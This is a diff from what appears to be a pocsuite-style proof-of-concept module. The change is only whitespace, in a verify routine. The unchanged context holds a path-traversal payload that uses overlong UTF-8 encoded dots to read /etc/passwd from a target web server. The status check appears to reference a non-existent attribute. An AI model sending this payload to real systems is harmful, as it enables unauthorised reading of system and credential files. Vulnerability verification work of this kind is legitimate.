@@ -66,7 +66,7 @@ class DemoPOC(POCBase):
         result = {}
         url = self.url
         payload = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
-        resp = requests.get(url+payload)
+        resp = requests.get(url + payload)
         try:
             if resp.status == 200:
                 result['VerifyInfo'] = {}
@@ -75,8 +75,6 @@ class DemoPOC(POCBase):
         except Exception as e:
             pass
         return self.parse_output(result)
-
-
 
     def _attack(self):
         result = {}
